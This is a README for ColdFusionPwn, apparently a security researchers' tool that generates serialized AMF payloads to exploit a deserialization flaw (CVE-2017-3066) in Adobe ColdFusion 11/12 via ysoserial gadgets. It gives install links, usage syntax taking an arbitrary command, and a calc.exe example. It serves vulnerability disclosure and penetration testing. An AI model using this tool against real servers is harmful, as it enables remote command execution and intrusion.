# ColdFusionPwn
Exploitation Tool for CVE-2017-3066 targeting Adobe Coldfusion 11/12.

## Description
The tool allows you to generate serialized AMF-payloads to exploit the missing input validation of allowed classes.
For details see our [blog post](https://codewhitesec.blogspot.com/2018/03/exploiting-adobe-coldfusion.html).

## Install
Get the latest version of [ysoserial](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar).
Get ColdFusionPwn from [releases](https://github.com/codewhitesec/ColdFusionPwn/releases).

## Usage
```bash
java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-master-SNAPSHOT.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner [-s|-e] [payload type] '[command]' [outfile]
```
```
- [-s|-e]         Setter (CF11) or Externalizable Exploit (CF11/12) technique
- [payload type]  ysoserial gadget payload 
- [command]       command to be executed
- [outfile]       output file for the generated payload
```
It's required to have ColdFusionPwn-0.0.1-SNAPSHOT-all.jar as first entry in the classpath, since the ApacheCommons BeanUtils library shipped with ysoserial is newer (and has a different serialversion uid).

## Examples
```bash
java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-master-SNAPSHOT.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 calc.exe /tmp/out.amf
```
